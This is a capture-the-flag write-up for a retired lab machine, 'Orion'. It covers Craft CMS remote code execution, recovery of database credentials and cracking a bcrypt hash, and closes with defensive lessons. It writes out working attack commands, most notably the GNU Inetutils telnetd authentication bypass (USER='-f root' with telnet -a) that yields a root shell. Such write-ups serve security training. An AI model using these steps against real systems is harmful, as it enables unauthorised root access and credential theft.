Machine Info

Difficulty: Easy

Status: Retired

Date Started: 24 June 2026

Summary

Orion is a easy Linux machine that focuses on web enumeration, Craft CMS exploitation, credential discovery, password cracking, and local privilege escalation through an exposed Telnet service.

The attack chain began with identifying a Craft CMS web application running behind Nginx. After discovering the Craft CMS admin portal, a vulnerable Craft CMS instance was exploited to gain initial access as www-data. From there, database credentials were recovered from the Craft configuration file, allowing access to the application database and extraction of a bcrypt password hash for the user adam.

After cracking the password hash, SSH access was obtained as adam. Privilege escalation was completed by identifying a local Telnet service running as root through inetd and abusing a GNU Inetutils Telnet authentication bypass to obtain a root shell.

Initial Access

Craft CMS Exploitation

Navigating to http://orion.htb/admin/ revealed a Craft CMS login portal. The page showed Craft CMS version 5.6.16, which was vulnerable to a pre-authenticated remote code execution issue.

Initial exploitation attempts failed because the module configuration did not match the target correctly. The main issue was that requests were being made against the raw IP address instead of the expected virtual host. After configuring the target to use orion.htb, the exploit successfully interacted with the Craft CMS instance.

The exploit leaked the PHP session save path, confirmed exploitability, and executed the payload successfully. This resulted in a shell as the web server user. 

python3 -c "import pty; pty.spawn('/bin/bash')"

www-data@orion:~/html/craft/web$ whoami
www-data

Database Access

The recovered database credentials were used to connect to MariaDB locally. 

mysql -u root -p orion

After authenticating, the Craft CMS database tables were listed and the users table was inspected. 

show tables;
select * from users;

Recovered User Hash

The users table contained an administrator account for adam@orion.htb with the username admin. A bcrypt hash was recovered from the password field.

The recovered bcrypt hash was saved locally and cracked with Hashcat using the rockyou.txt wordlist.

Privilege Escalation

Initial Local Enumeration

After gaining access as adam, standard local enumeration was performed. The user was not allowed to run commands with sudo. 

whoami
id
sudo -l
uid=1000(adam) gid=1000(adam) groups=1000(adam)
Sorry, user adam may not run sudo on orion.

SUID Enumeration

SUID binaries were checked, but the initially reviewed paths did not provide the intended escalation route. 

find / -perm -4000 -type f 2>/dev/null

Listening Services

Local listening services were reviewed using ss. This revealed that port 23, the Telnet service, was listening only on localhost. 

ss -tulnp
127.0.0.1:23      LISTEN
127.0.0.1:3306    LISTEN
0.0.0.0:80        LISTEN
0.0.0.0:22        LISTEN

Inetd Configuration

The Telnet service was configured through inetd. Reviewing /etc/inetd.conf showed that Telnet was bound to localhost and configured to run as root. 

cat /etc/inetd.conf
127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd

The Telnet daemon path was a symbolic link to /usr/libexec/telnetd. 

ls -la /usr/local/sbin/telnetd
file /usr/local/sbin/telnetd
/usr/local/sbin/telnetd -> /usr/libexec/telnetd

Telnet Version

The installed Telnet version was identified as GNU Inetutils 2.7. 

telnet --version
telnet (GNU inetutils) 2.7

Telnet Authentication Bypass

GNU Inetutils Telnet was vulnerable to an authentication bypass issue. By setting the USER environment variable to -f root and connecting to the local Telnet service with automatic login, a root shell was obtained. 

USER="-f root"
telnet -a 127.0.0.1
Trying 127.0.0.1...
Connected to 127.0.0.1.

root@orion:~# whoami
root

Lessons Learned

Orion demonstrated the importance of proper virtual host configuration during web exploitation. The Craft CMS exploit initially failed because the requests were not aligned with the expected application hostname. Once the correct hostname was used, the exploit worked as intended.

This machine also reinforced why sensitive configuration files should be protected carefully. The Craft CMS .env file exposed database credentials, which allowed access to the backend database and led to the recovery of a password hash for a valid user.

The privilege escalation path showed the risk of legacy or misconfigured local services. Even though Telnet was only listening on localhost, it was running as root through inetd. A vulnerable Telnet daemon allowed authentication bypass and resulted in full root access.

Key defensive takeaways include keeping CMS platforms patched, avoiding exposed secrets in application directories, using strong password hygiene, disabling unnecessary legacy services like Telnet, and auditing local services that run with elevated privileges.
